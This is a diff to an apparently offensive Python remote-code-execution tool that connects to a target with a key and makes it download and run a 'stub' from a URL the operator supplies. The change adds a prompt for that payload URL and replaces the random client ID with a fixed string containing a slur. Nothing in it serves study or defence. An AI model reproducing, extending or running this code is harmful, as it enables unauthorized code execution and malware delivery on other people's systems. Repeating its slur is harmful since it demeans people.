@@ -24,7 +24,7 @@ class Packet:
         return b.getbuffer().tobytes()
 
 def genid(length=8):
-    return ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(length))
+    return 'sybauretard'
 
 def sendpacket(sock, packet, key):
     key_hash = hashlib.md5(key.encode('utf-8')).digest()
@@ -35,11 +35,8 @@ def sendpacket(sock, packet, key):
     sock.send(encrypted)
     return encrypted
 
-def rce(host, port, key):
+def rce(host, port, key, file_url):
     client_id = genid()
-
-
-    file_url = "" # ur stub url
 
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     sock.settimeout(10)
@@ -73,7 +70,7 @@ def main(key, host, port):
     
     print(Fore.YELLOW + f"[?] Executing file." + Fore.RESET)
     print(Fore.YELLOW + f"[?] RCEING {host}:{port} with key {key}" + Fore.RESET)
-    rce(host, port, key)
+    rce(host, port, key, file_url)
     print(Fore.GREEN + f"[+] Execution completed" + Fore.RESET)
 
 if __name__ == "__main__":
@@ -94,4 +91,5 @@ made by discord.gg/exposing
     key = input(Fore.YELLOW + f"[?] Key: " + Fore.RESET)
     host = input(Fore.YELLOW + f"[?] Host: " + Fore.RESET)
     port = int(input(Fore.YELLOW + f"[?] Port: " + Fore.RESET))
+    file_url = input(Fore.YELLOW + "[?] Whats stub url: ")
     main(key, host, port)
